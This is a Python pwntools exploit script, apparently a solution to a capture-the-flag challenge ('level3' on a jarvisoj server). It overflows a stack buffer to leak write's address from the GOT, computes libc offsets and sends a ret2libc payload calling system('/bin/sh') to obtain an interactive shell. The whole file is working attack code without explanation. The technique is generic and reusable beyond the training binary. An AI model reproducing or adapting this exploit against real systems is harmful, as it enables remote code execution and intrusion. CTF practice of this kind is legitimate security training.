from pwn import *

#context.log_level = "debug"
elf = ELF('level3')
plt_write = elf.plt['write']
got_write = elf.got['write']
main_addr = 0x08048484
#r = remote('127.0.0.1',4000)
r = remote("pwn2.jarvisoj.com",9879)
r.recvline()
payload = 'a'*0x88 + 'a' * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(got_write) + p32(4)
r.sendline(payload)

write_addr = u32(r.recv(4))

print "write_addr: " + hex(write_addr)

#r.recvline(':')

libc = ELF('libc-2.19.so')
bss_addr=0x0804a024

bin_sh_off = next(libc.search('/bin/sh'))
write_off = libc.symbols['write']
system_off = libc.symbols['system']
libc_base = write_addr - write_off
system_addr = libc_base + system_off

print "system_addr: " + hex(system_addr)

bin_sh_addr = libc_base + bin_sh_off
pop_pop_pop_ret = 1

#raw_input()
#r.recvuntil()
sleep(2)
r.recvline()
payload2 = 'a' * 0x88 + 'a' * 4 + p32(system_addr) + p32(1) + p32(bin_sh_addr)
r.sendline(payload2)

r.interactive()
